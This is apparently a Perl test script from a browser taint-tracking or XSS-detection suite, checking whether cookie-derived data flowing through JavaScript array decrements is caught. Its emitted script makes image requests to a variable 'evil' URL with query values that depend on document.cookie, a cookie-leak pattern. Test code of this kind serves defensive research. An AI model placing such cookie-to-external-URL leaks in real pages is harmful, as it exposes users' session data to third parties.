#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_DECELEM";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil
		
		var notevil = [1,2];
		var url = "$imgevilurl?normal=" + --notevil[1];
		document.images[0].src = url;
		
		// if with evil val
		
		var notevil2 = [1,2];
		if ($evil) {
			--notevil2[1];
		}
		url = "$imgevilurl?if=" + notevil2[1];
		document.images[1].src = url;
		
		// normal usage
		
		var evil = 0;
		if ($evil) {
			evil = 2;
		}
		var notevil3 = [1,evil];
		--notevil3[1];
		document.images[2].src = "$imgevilurl?isevil=" + notevil3[1];
		
    </script>
|;

require "xss_basic_footer.pl";
